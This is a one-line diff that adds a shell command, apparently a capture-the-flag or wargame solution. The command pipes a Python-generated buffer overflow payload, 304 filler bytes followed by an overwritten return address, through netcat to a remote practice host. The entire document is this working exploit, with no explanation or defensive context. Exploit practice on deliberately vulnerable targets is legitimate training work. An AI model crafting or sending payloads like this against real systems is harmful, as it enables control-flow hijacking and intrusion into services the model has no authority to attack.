@@ -1,0 +1,1 @@
+python -c 'print "A"*304 + "\xa5\x85\x04\x08"' | nc prob.vulnerable.kr 20026
